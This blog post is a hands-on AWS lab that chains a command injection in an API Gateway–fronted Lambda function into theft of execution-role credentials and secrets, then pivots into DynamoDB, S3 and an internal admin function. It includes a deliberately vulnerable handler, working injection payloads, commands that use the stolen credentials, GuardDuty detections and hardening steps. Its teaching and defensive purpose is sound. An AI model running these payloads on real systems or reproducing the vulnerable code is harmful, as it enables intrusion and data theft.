---
layout: post
title: "Lab — Lambda Attack Chain: From API Gateway Injection to AWS Account Pivot"
date: 2026-07-04T10:00:00
categories:
  - AWS Security Labs
  - Serverless lab
tags:
  - aws
  - lambda
  - serverless
  - api-gateway
  - iam
  - privilege-escalation
  - guardduty
  - cloud-attack
  - lab
author: muhammed
description: A hands-on lab demonstrating how a command injection flaw in a Lambda function behind API Gateway leaks execution role credentials and environment-variable secrets, then how the over-privileged execution role is abused to pivot into DynamoDB and a second, "internal-only" Lambda function — with GuardDuty Lambda Protection detection and least-privilege fixes.
toc: true
pin: false
math: false
mermaid: false
image: https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fwww.cloudzero.com%2Fwp-content%2Fuploads%2F2024%2F10%2Flambda-alternatives-1024x536.webp&f=1&nofb=1&ipt=d0d30999a776468c0f16ee550dec7681b20af65d704abeba890736f5e9c57bdd
---

## Objective

Exploit a command injection vulnerability in a Lambda function exposed through API Gateway.
Steal the function's execution role credentials and its plaintext environment-variable secrets  without ever touching an EC2 instance, a container, or a Kubernetes pod.
Use the over-privileged execution role to pivot into DynamoDB, S3, and a second "internal-only" Lambda function that was never meant to be reachable from the outside.
Detect the entire chain with GuardDuty Lambda Protection.
Fix it with least-privilege roles, Secrets Manager, and invocation-source restrictions.

**Run this only in an AWS account you own.**

---

## Why Serverless Is Not "No Ops, No Attack Surface"

"Serverless" is sold as inherently more secure  no OS to patch, no server to harden, no long-lived host for an attacker to camp out on.
That's true at the infrastructure layer. It says nothing about the application code running inside the function, or the IAM role attached to it.

Every Lambda function runs with an **execution role**. That role's temporary credentials are injected into the execution environment the same way IMDS injects credentials into an EC2 instance except there's no IMDSv2-style hop-count defense to bypass. If your function code can be tricked into running attacker-controlled commands, the attacker gets the execution role's credentials for free, via environment variables. No SSRF, no metadata hop required.

Combine that with a second extremely common mistake  storing secrets directly in Lambda environment variables instead of Secrets Manager or Parameter Store  and a single injection bug in one function becomes a fast path into every table, bucket, and function that role can touch.

The previous labs in this series required IMDS, IRSA, or a CI/CD pipeline to reach AWS credentials. This one shows the shortest path yet: one HTTP request to a public API Gateway endpoint.

---

## Attack Chain

```
Internet → API Gateway (public REST API: orders-api)
    │
    │  Step 1: Command injection in the Lambda handler
    ▼
Lambda execution environment (function: order-processor)
    │
    │  Step 2: Dump environment → execution role creds + plaintext secrets
    │  Step 3: sts get-caller-identity confirms role: order processorrole
    ▼
Stolen execution role credentials (used from outside Lambda entirely)
    │
    │  Step 4: Enumerate & pivot — DynamoDB, S3, list other Lambda functions
    │  Step 5: Directly invoke the "admin-tasks" internal-only function
    ▼
Full data-plane compromise: customer PII exposed + admin function abused
```

---

## Lab Architecture

```
API Gateway: orders-api (public REST API)
    │
    └── POST /track-order → Lambda: order-processor
            Execution role: order-processor-role
              - dynamodb:* on orders-table          (over-scoped — should be Get/PutItem only)
              - s3:GetObject / s3:PutObject on customer-exports/*
              - lambda:InvokeFunction on *           (over-scoped — no resource restriction)
            Environment variables (plaintext, unencrypted):
              - DB_PASSWORD   = "Sup3rSecret!23"
              - STRIPE_API_KEY = "sk_live_51H8x...redacted"

    Lambda: admin-tasks (internal only — meant to run only on an EventBridge schedule)
        Execution role: admin-tasks-role
          - iam:CreateAccessKey, iam:AttachUserPolicy
          - dynamodb:DeleteTable
        No resource-based policy restricting who can invoke it —
        anyone holding credentials with lambda:InvokeFunction can call it directly.
```

---

## Phase 0 Setup

### Step 0.1  Create the DynamoDB Table and S3 Bucket

```bash
aws dynamodb create-table \
  --table-name orders-table \
  --attribute-definitions AttributeName=OrderId,AttributeType=S \
  --key-schema AttributeName=OrderId,KeyType=HASH \
  --billing-mode PAY_PER_REQUEST

# Seed with fake customer PII
aws dynamodb put-item --table-name orders-table --item '{
  "OrderId": {"S": "ORD-1001"},
  "CustomerName": {"S": "Jane Doe"},
  "CardLast4": {"S": "4242"},
  "Email": {"S": "jane.doe@example.com"}
}'

aws s3 mb s3://customer-exports-lab-demo
```

### Step 0.2 Write the Vulnerable Lambda Function

The `/track-order` endpoint "validates" a carrier tracking number by shelling out to `nslookup` against a carrier-lookup hostname built from user input — a real-world anti-pattern for anything that touches a shell.

```python
# order_processor/app.py
import json
import os
import subprocess
import boto3

dynamodb = boto3.resource("dynamodb")
table = dynamodb.Table("orders-table")

def handler(event, context):
    body = json.loads(event.get("body") or "{}")
    order_id = body.get("order_id", "")
    tracking_number = body.get("tracking_number", "")

    # VULNERABLE: unsanitized input concatenated into a shell command
    cmd = f"nslookup {tracking_number}.carrier-status.example.com"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

    item = table.get_item(Key={"OrderId": order_id}).get("Item")

    return {
        "statusCode": 200,
        "body": json.dumps({
            "order": item,
            "carrier_check": result.stdout[:200]
        })
    }
```

### Step 0.3 Define the Over-Privileged Execution Role

```bash
cat > order-processor-trust.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"Service": "lambda.amazonaws.com"},
    "Action": "sts:AssumeRole"
  }]
}
EOF

aws iam create-role \
  --role-name order-processor-role \
  --assume-role-policy-document file://order-processor-trust.json

cat > order-processor-policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {"Effect": "Allow", "Action": "dynamodb:*", "Resource": "arn:aws:dynamodb:*:*:table/orders-table"},
    {"Effect": "Allow", "Action": ["s3:GetObject", "s3:PutObject"], "Resource": "arn:aws:s3:::customer-exports-lab-demo/*"},
    {"Effect": "Allow", "Action": "lambda:InvokeFunction", "Resource": "*"}
  ]
}
EOF

aws iam put-role-policy \
  --role-name order-processor-role \
  --policy-name order-processor-inline \
  --policy-document file://order-processor-policy.json

aws iam attach-role-policy \
  --role-name order-processor-role \
  --policy-arn arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole
```

### Step 0.4  Deploy the Function With Plaintext Secrets in Env Vars

```bash
zip -r order_processor.zip order_processor/

ROLE_ARN=$(aws iam get-role --role-name order-processor-role --query 'Role.Arn' --output text)

aws lambda create-function \
  --function-name order-processor \
  --runtime python3.12 \
  --handler app.handler \
  --role $ROLE_ARN \
  --zip-file fileb://order_processor.zip \
  --timeout 10 \
  --environment "Variables={DB_PASSWORD=Sup3rSecret!23,STRIPE_API_KEY=sk_live_51H8xREDACTED}"
```

### Step 0.5  Deploy the Internal "admin-tasks" Function

```python
# admin_tasks/app.py
import boto3

iam = boto3.client("iam")
dynamodb = boto3.client("dynamodb")

def handler(event, context):
    action = event.get("action")
    if action == "rotate_admin_key":
        key = iam.create_access_key(UserName="platform-admin")
        return {"new_access_key": key["AccessKey"]["AccessKeyId"]}
    if action == "purge_table":
        dynamodb.delete_table(TableName=event["table"])
        return {"status": "deleted"}
    return {"status": "no-op"}
```

```bash
cat > admin-tasks-policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {"Effect": "Allow", "Action": ["iam:CreateAccessKey", "iam:AttachUserPolicy"], "Resource": "*"},
    {"Effect": "Allow", "Action": "dynamodb:DeleteTable", "Resource": "*"}
  ]
}
EOF

aws iam create-role --role-name admin-tasks-role --assume-role-policy-document file://order-processor-trust.json
aws iam put-role-policy --role-name admin-tasks-role --policy-name admin-tasks-inline --policy-document file://admin-tasks-policy.json

zip -r admin_tasks.zip admin_tasks/
ADMIN_ROLE_ARN=$(aws iam get-role --role-name admin-tasks-role --query 'Role.Arn' --output text)

aws lambda create-function \
  --function-name admin-tasks \
  --runtime python3.12 \
  --handler app.handler \
  --role $ADMIN_ROLE_ARN \
  --zip-file fileb://admin_tasks.zip \
  --timeout 10

# MISCONFIGURATION: no resource-based policy restricting who can invoke this
# function — it was designed to be triggered only by an EventBridge rule, but
# nothing enforces that.
```

### Step 0.6  Wire Up API Gateway

```bash
aws apigatewayv2 create-api \
  --name orders-api \
  --protocol-type HTTP \
  --target $(aws lambda get-function --function-name order-processor --query 'Configuration.FunctionArn' --output text)

# Grant API Gateway permission to invoke the function
aws lambda add-permission \
  --function-name order-processor \
  --statement-id apigw-invoke \
  --action lambda:InvokeFunction \
  --principal apigateway.amazonaws.com
```



---

## Phase 1  Discover and Exploit the Injection

First, confirm normal behavior:

```bash
API_URL=$(aws apigatewayv2 get-apis --query "Items[?Name=='orders-api'].ApiEndpoint" --output text)

curl -X POST "$API_URL/track-order" \
  -H "Content-Type: application/json" \
  -d '{"order_id": "ORD-1001", "tracking_number": "1Z999AA1"}'
```

Now test whether the `tracking_number` field reaches a shell:

```bash
curl -X POST "$API_URL/track-order" \
  -H "Content-Type: application/json" \
  -d '{"order_id": "ORD-1001", "tracking_number": "1Z999AA1; id"}'
```

The `carrier_check` field in the response includes the output of `id`, confirming the tracking number is concatenated straight into a shell command classic command injection.

 curl response with `carrier_check` containing `uid=993(sbx_user...) gid=990(sbx_group...)`  proof of code execution inside the Lambda sandbox

---

## Phase 2  Harvest Execution Role Credentials and Plaintext Secrets

Every Lambda invocation has AWS credentials and any configured environment variables sitting in `os.environ`. Dump them through the same injection point:

```bash
curl -X POST "$API_URL/track-order" \
  -H "Content-Type: application/json" \
  -d '{"order_id": "ORD-1001", "tracking_number": "1Z999AA1; env"}'
```

Response (`carrier_check`, truncated to 200 chars in the vulnerable handler — request it again with a `cut` or grep injected to page through the rest):

```bash
curl -X POST "$API_URL/track-order" \
  -H "Content-Type: application/json" \
  -d '{"order_id": "ORD-1001", "tracking_number": "1Z999AA1; env | grep -E \"AWS_|DB_PASSWORD|STRIPE\""}'
```

```
AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEP...
DB_PASSWORD=Sup3rSecret!23
STRIPE_API_KEY=sk_live_51H8xREDACTED
```

injected `env` output showing `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`, `DB_PASSWORD`, and `STRIPE_API_KEY` in plaintext

Note the difference from the EC2 and IRSA labs: there was no metadata endpoint to call, no token file to read separately. The Lambda runtime hands the execution role's credentials to the process directly as environment variables anything that can read `env` inside the function has them.

Confirm the stolen credentials work from your attacker machine, entirely outside AWS:

```bash
export AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEP...

aws sts get-caller-identity
```

```json
{
  "UserId": "AROAEXAMPLE:order-processor",
  "Account": "123456789012",
  "Arn": "arn:aws:sts::123456789012:assumed-role/order-processor-role/order-processor"
}
```

 `aws sts get-caller-identity` run from an attacker laptop, confirming the stolen creds are valid for `order-processor-role`

**GuardDuty finding:**

```
UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS
```

Lambda execution role credentials being used from an IP address outside AWS-managed ranges is just as anomalous as stolen EC2 instance credentials being used off-network — GuardDuty's credential-exfiltration detection isn't specific to EC2.

---

## Phase 3  Enumerate and Pivot With Stolen Credentials

```bash
# Dump every order — customer PII, no query restrictions on the role
aws dynamodb scan --table-name orders-table

# List and pull whatever's in the exports bucket
aws s3 ls s3://customer-exports-lab-demo --recursive
aws s3 cp s3://customer-exports-lab-demo/ ./stolen/ --recursive

# Discover what else this role can touch
aws lambda list-functions --query 'Functions[].FunctionName'
```

```
[
    "order-processor",
    "admin-tasks"
]
```

`admin-tasks` was never wired to API Gateway and was intended to run only on a schedule but `order-processor-role` has an unscoped `lambda:InvokeFunction` on `*`, so it's directly callable:

```bash
aws lambda invoke \
  --function-name admin-tasks \
  --payload '{"action":"rotate_admin_key"}' \
  --cli-binary-format raw-in-base64-out \
  response.json

cat response.json
```

```json
{"new_access_key": "AKIAIOSFODNN7EXAMPLE"}
```

 `aws lambda invoke` against `admin-tasks` from stolen `order-processor-role` credentials, returning a freshly minted IAM access key for `platform-admin`

This is the key lesson of the lab: **Lambda-to-Lambda invocation crosses IAM role boundaries silently.** `order-processor-role` never had `iam:CreateAccessKey` itself — but by invoking `admin-tasks`, it triggered code running under `admin-tasks-role`, which does. The privilege boundary that matters isn't just "what can this role call" — it's "what can this role's calls cause to happen."

**GuardDuty finding:**

```
Discovery:Lambda/AnomalousBehavior
```

GuardDuty Lambda Protection profiles each function's normal invocation sources and API call patterns. A function that has never been invoked by anything other than EventBridge suddenly being invoked directly via the Lambda API, from credentials belonging to a different function entirely, is exactly the kind of behavioral anomaly it's built to catch.

---

## Phase 4  Hardening

### Fix 1  Least-Privilege Execution Role

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["dynamodb:GetItem", "dynamodb:PutItem"],
      "Resource": "arn:aws:dynamodb:*:*:table/orders-table"
    },
    {
      "Effect": "Allow",
      "Action": "s3:PutObject",
      "Resource": "arn:aws:s3:::customer-exports-lab-demo/order-processor/*"
    }
  ]
}
```

Remove `dynamodb:*`, remove S3 read access the function doesn't need, and  critically  remove the wildcard `lambda:InvokeFunction`. `order-processor` has no legitimate reason to call any other Lambda function.

```bash
aws iam delete-role-policy --role-name order-processor-role --policy-name order-processor-inline
aws iam put-role-policy \
  --role-name order-processor-role \
  --policy-name order-processor-scoped \
  --policy-document file://order-processor-scoped-policy.json
```

### Fix 2  Secrets Belong in Secrets Manager, Not Environment Variables

```bash
aws secretsmanager create-secret \
  --name order-processor/db-password \
  --secret-string "Sup3rSecret!23"

aws secretsmanager create-secret \
  --name order-processor/stripe-key \
  --secret-string "sk_live_51H8xREDACTED"
```

Grant the role read access to only those two secrets, by ARN, and fetch them at runtime instead of reading `os.environ`:

```json
{
  "Effect": "Allow",
  "Action": "secretsmanager:GetSecretValue",
  "Resource": [
    "arn:aws:secretsmanager:*:*:secret:order-processor/db-password-*",
    "arn:aws:secretsmanager:*:*:secret:order-processor/stripe-key-*"
  ]
}
```

```python
import boto3
secrets = boto3.client("secretsmanager")

def get_secret(name):
    return secrets.get_secret_value(SecretId=name)["SecretString"]

db_password = get_secret("order-processor/db-password")
```

This doesn't stop the credential theft in Phase 2  the execution role credentials are still exposed the same way. But it removes `DB_PASSWORD` and `STRIPE_API_KEY` from the blast radius entirely: an attacker with the execution role's credentials still needs `secretsmanager:GetSecretValue` on those specific ARNs, which a properly scoped role won't grant beyond what the function itself needs, and every access is logged individually in CloudTrail.

### Fix 3  Never Shell Out With Unsanitized Input

```python
import ipaddress
import dns.resolver  # use a library, not a shell command

def validate_tracking_number(tracking_number: str) -> bool:
    return tracking_number.isalnum() and len(tracking_number) <= 30

def handler(event, context):
    body = json.loads(event.get("body") or "{}")
    tracking_number = body.get("tracking_number", "")

    if not validate_tracking_number(tracking_number):
        return {"statusCode": 400, "body": "invalid tracking number"}

    # Call the carrier's API directly instead of shelling out to nslookup
    carrier_status = call_carrier_api(tracking_number)
    ...
```

If you must run a subprocess, never use `shell=True` with interpolated input pass arguments as a list so the shell never re-parses them:

```python
subprocess.run(["nslookup", tracking_number], capture_output=True, text=True)
```

This alone still isn't a substitute for input validation  it just removes the shell metacharacter injection vector.

### Fix 4 Restrict Who Can Invoke Internal Functions

`admin-tasks` should only ever be invoked by its EventBridge rule. Enforce that with a resource-based policy scoped to the rule's ARN, instead of relying on IAM alone:

```bash
aws lambda add-permission \
  --function-name admin-tasks \
  --statement-id eventbridge-only \
  --action lambda:InvokeFunction \
  --principal events.amazonaws.com \
  --source-arn arn:aws:events:us-east-1:123456789012:rule/admin-tasks-schedule
```

With this in place, even if `order-processor-role` still had `lambda:InvokeFunction` on `*`, the resource policy on `admin-tasks` itself would reject any caller that isn't the named EventBridge rule.

### Fix 5  Enable GuardDuty Lambda Protection

```bash
aws guardduty update-detector \
  --detector-id YOUR_DETECTOR_ID \
  --features '[{
    "Name": "LAMBDA_NETWORK_LOGS",
    "Status": "ENABLED"
  }]'
```

With Lambda Protection enabled, GuardDuty monitors each function's network activity the same way it monitors EC2 VPC Flow Logs, surfacing findings such as:

| Behavior | Finding |
|----------|---------|
| Function calling a known C2 domain | `Backdoor:Lambda/C&CActivity.B!DNS` |
| Function contacting a cryptomining pool | `CryptoCurrency:Lambda/BitcoinTool.B!DNS` |
| Invocation pattern deviates from baseline | `Discovery:Lambda/AnomalousBehavior` |
| Traffic to a known-malicious IP | `Impact:Lambda/MaliciousIPAddress.Reputation` |

 GuardDuty → detector settings showing Lambda Protection enabled, with findings appearing for `order-processor`

### Fix 6  Reduce Blast Radius With VPC Egress Control and Reserved Concurrency

If a function doesn't need broad internet access, attach it to a VPC with no NAT gateway or a tightly scoped security group  this blocks arbitrary outbound C2/exfil traffic even if the code is compromised. Set reserved concurrency on sensitive functions so a compromised function can't be abused to exhaust account-wide Lambda concurrency as a denial-of-service side effect.

```bash
aws lambda put-function-concurrency \
  --function-name admin-tasks \
  --reserved-concurrent-executions 1
```

---

## Key Takeaways

- Lambda execution role credentials are handed to the running process as plain environment variables  there is no IMDSv2-style hop-count defense to bypass, any code execution inside the function is credential theft
- Environment variables are not a secrets store: anyone who can read `env` inside the function, or call `lambda:GetFunctionConfiguration` from outside, sees them in plaintext
- `lambda:InvokeFunction` on `*` lets one function's stolen credentials silently trigger a completely different function's execution role  the real privilege boundary is what your calls can *cause*, not just what your role can directly do
- A resource-based policy on the callee is the only reliable way to restrict *who* can invoke an internal-only function; IAM allow rules on the caller side are not enough on their own
- GuardDuty doesn't see the application-layer injection bug at all it sees the resulting credential misuse and network anomalies. Fixing the injection is still the only way to prevent the theft in the first place

---

## Cleanup

```bash
aws lambda delete-function --function-name order-processor
aws lambda delete-function --function-name admin-tasks
aws apigatewayv2 delete-api --api-id $(aws apigatewayv2 get-apis --query "Items[?Name=='orders-api'].ApiId" --output text)

aws dynamodb delete-table --table-name orders-table
aws s3 rb s3://customer-exports-lab-demo --force

aws iam delete-role-policy --role-name order-processor-role --policy-name order-processor-scoped
aws iam detach-role-policy --role-name order-processor-role --policy-arn arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole
aws iam delete-role --role-name order-processor-role

aws iam delete-role-policy --role-name admin-tasks-role --policy-name admin-tasks-inline
aws iam delete-role --role-name admin-tasks-role

aws secretsmanager delete-secret --secret-id order-processor/db-password --force-delete-without-recovery
aws secretsmanager delete-secret --secret-id order-processor/stripe-key --force-delete-without-recovery
```

---

## You can find me online at:

![My signature image](/assets/img/footer-signature.png)

- **GitHub:** [Mhdomer](https://github.com/Mhdomer)
- **LinkedIn:** [mhd3omar](https://www.linkedin.com/in/mhd3omar/)
- **Tryhackme:** [nonlouy](https://tryhackme.com/p/nonlouy)
